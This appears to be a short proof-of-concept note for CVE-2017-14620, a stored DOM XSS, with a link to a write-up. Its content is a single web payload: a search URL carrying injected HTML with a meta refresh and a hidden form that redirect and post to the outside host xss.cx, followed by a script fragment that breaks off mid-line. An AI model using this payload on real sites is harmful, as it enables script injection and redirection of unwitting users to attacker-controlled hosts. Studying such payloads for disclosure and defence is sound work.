## CVE-2017-14620 PoC

https://www.cloudscan.me/2017/09/cve-2017-14620-stored-dom-xss.html

```
http://www.bing.com/search?q=<html><head><meta http-equiv=\"refresh\" content=\"5; url=http://xss.cx/\">
<title>Loading</title></head>\n<body><form method=\"post\" action=\"http://xss.cx/\" target=\"_top\" id=\"rf\">
<input type=\"hidden\" name=\"ic\" value=\"0\"><input type=\"hidden\" name=\"fb\" value=\"true\"/></form>\n
<script>!function(e,t){var n,i;return!e.navigator&form=SITE-###&sc=XXX&sp=boolean&qs=true&sk=false
```
